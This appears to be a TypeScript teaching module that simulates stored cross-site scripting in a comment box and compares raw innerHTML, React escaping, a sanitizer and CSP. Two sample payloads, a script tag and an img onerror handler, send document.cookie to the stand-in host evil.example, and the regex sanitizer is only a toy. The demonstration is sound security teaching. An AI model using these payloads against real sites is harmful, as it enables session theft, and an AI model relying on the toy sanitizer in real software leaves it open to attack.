// Stored cross-site scripting. An attacker posts a comment containing HTML; every visitor's
// browser renders it. What runs depends on how the page puts the comment on screen.
// Nothing here is executed: the outcome is worked out from the text and shown.

export type Payload = { id: string; label: string; text: string };

export const PAYLOADS: Payload[] = [
  { id: "plain", label: "Normal comment", text: "Great post, thanks!" },
  { id: "bold", label: "Harmless HTML", text: "This is <b>so</b> useful." },
  { id: "script", label: "<script> tag", text: "Nice!<script>fetch('https://evil.example/?c=' + document.cookie)</script>" },
  { id: "img", label: "Image with onerror", text: `Look:<img src="x" onerror="fetch('https://evil.example/?c=' + document.cookie)">` },
];

export type Mode = "innerHTML" | "escaped" | "sanitized" | "csp";

export const MODES: { id: Mode; label: string; code: string; note: string }[] = [
  { id: "innerHTML", label: "Raw HTML", code: "el.innerHTML = comment", note: "The comment is treated as HTML." },
  { id: "escaped", label: "Escaped text", code: "<p>{comment}</p>", note: "React escapes text by default: < becomes &lt;, so tags show as text." },
  { id: "sanitized", label: "Sanitized HTML", code: "el.innerHTML = DOMPurify.sanitize(comment)", note: "Keep safe tags like <b>, strip scripts and event handlers." },
  { id: "csp", label: "Raw HTML + CSP", code: "Content-Security-Policy: script-src 'self'", note: "Still raw HTML, but the browser refuses inline scripts and handlers." },
];

export const escapeHtml = (s: string) => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");

// A tiny allow-list sanitizer: keep <b>, <i>, <em>, <strong> without attributes; drop the rest.
export function sanitize(s: string) {
  return s
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<(\/?)(b|i|em|strong)\b[^>]*>/gi, "<$1$2>")
    .replace(/<(?!\/?(b|i|em|strong)>)[^>]*>/gi, "");
}

export type Outcome = { html: string; runs: boolean; why: string; stolen: boolean };

export function render(p: Payload, mode: Mode): Outcome {
  const hasScriptTag = /<script/i.test(p.text);
  const hasHandler = /\son\w+\s*=/i.test(p.text);
  if (mode === "escaped") return { html: escapeHtml(p.text), runs: false, why: "Everything is text. The tags are shown, not run.", stolen: false };
  if (mode === "sanitized") {
    const html = sanitize(p.text);
    return { html, runs: false, why: hasScriptTag || hasHandler ? "The sanitizer removed the script and the handler before rendering." : "Nothing dangerous to remove.", stolen: false };
  }
  if (mode === "csp") {
    const blocked = hasScriptTag || hasHandler;
    return { html: p.text, runs: false, why: blocked ? "The HTML is inserted, but CSP blocks the inline code. The browser logs a violation instead." : "No inline code, so CSP has nothing to block.", stolen: false };
  }
  // innerHTML: <script> inserted this way does not run, but event handlers do.
  if (hasHandler) return { html: p.text, runs: true, why: "The image fails to load, onerror fires, and the attacker's code runs with the visitor's cookies.", stolen: true };
  if (hasScriptTag) return { html: p.text, runs: false, why: "Lucky: scripts inserted with innerHTML don't execute. Rendered on the server or with document.write, it would.", stolen: false };
  return { html: p.text, runs: false, why: "Just formatting. Raw HTML works fine until someone sends something else.", stolen: false };
}
